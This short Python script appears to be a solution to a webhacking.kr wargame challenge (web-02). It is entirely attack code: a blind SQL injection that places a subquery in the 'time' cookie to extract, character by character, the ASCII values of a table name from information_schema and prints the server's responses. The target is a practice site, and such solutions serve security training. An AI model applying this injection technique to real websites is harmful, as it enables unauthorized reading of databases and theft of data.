#pip install requests


import requests as rq
import urllib.request

url = "https://webhacking.kr/challenge/web-02/"



for i in range(13):
    cookie = "(select ascii(substring(table_name,"+str(i+1)+",1)) from information_schema.tables where table_schema=database() limit 0,1)"
    res = rq.post(url,cookies = {"time":cookie})
    print(res.text)
